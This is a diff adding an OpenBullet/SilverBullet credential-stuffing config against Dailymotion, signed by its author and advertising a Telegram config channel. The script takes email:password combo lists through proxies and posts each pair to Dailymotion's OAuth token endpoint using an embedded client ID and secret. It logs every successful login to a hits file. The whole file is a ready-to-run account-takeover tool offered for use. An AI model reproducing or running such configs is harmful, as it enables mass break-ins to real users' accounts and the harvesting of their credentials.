@@ -1,0 +1,82 @@
+[SETTINGS]
+{
+  "Name": "Dailymotion @Alone_Devilz",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-07-11T23:42:55.6726542+00:00",
+  "AdditionalInfo": "",
+  "Author": "@Alone_Devilz",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [
+    {
+      "Description": "Join : @Silverbullet_Configs1",
+      "VariableName": "",
+      "Id": 1670451563
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+!#DailyMotion_Configs RECAPTCHA "https://google.com" "" -> VAR "" 
+
+#（芋演ァ） FUNCTION GenerateGUID -> VAR "id" 
+
+#（ギ永ヽ） REQUEST POST "https://graphql.api.dailymotion.com/oauth/token" 
+  CONTENT "version=3&client_id=59beb5aba1f9ba4add3e&client_secret=6c4f72b11f4c8ef7cd7dd5fab3e314d3be1eb7b4&grant_type=password&visitor_id=<id>&scope=userinfo&username=<USER>&password=<PASS>&traffic_segment=493679" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Content-Type: application/x-www-form-urlencoded" 
+  HEADER "Content-Length: 254" 
+  HEADER "Host: graphql.api.dailymotion.com" 
+  HEADER "Connection: Keep-Alive" 
+  HEADER "Accept-Encoding: gzip" 
+  HEADER "User-Agent: okhttp/4.9.1" 
+
+#（雲液虞） KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<RESPONSECODE>" Contains "20" 
+  KEYCHAIN Failure OR 
+    KEY "<RESPONSECODE>" Contains "40" 
+
+#（園゠ゕ） UTILITY File "DailyMotion Hit @Alone_Devilz.txt" WriteLines "<USER>:<PASS>" -> VAR "Save" 
+
+#（イにド） FUNCTION Constant "@Alone_Devilz" -> CAP "CONFIGS BY:" 
+
